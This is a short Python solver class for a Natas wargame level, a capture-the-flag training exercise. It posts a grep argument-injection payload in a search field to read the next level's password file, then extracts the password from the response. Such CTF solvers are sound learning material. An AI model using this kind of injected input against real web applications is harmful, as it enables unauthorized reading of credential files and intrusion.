import re
from .base_solver import NatasSolver

class Natas9Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Exploit command injection in grep using .* wildcard
            payload = ".* /etc/natas_webpass/natas10 #"
            
            response = self.make_request(
                method="POST",
                data={"needle": payload, "submit": "Search"}
            )

            # Extract password using the correct regex pattern
            match = re.findall(r"/etc/natas_webpass/natas10:(.*)", response.text)
            if not match:
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas9: {str(e)}")